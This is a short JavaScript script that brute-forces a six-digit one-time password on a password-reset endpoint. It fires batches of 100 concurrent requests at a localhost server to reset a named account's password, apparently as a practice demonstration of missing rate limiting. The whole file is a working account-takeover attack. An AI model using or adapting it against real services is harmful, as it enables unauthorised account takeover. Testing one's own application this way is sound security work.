import axios from 'axios';
async function sendRequest(otp) {
    let data = JSON.stringify({
        "email": "hydrasam@gmail.com",
        "otp": otp,
        "newPassword": 121212
    });
    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };
    try {
        await axios.request(config)
            .then((response) => {
            console.log(JSON.stringify(response.data));
        })
            .catch((error) => {
            //console.log(error);
        });
    }
    catch (error) {
        //console.log(error)
    }
}
async function main() {
    for (let i = 100000; i < 999999; i += 100) {
        const p = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            console.log(i);
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}
main();
//# sourceMappingURL=index.js.map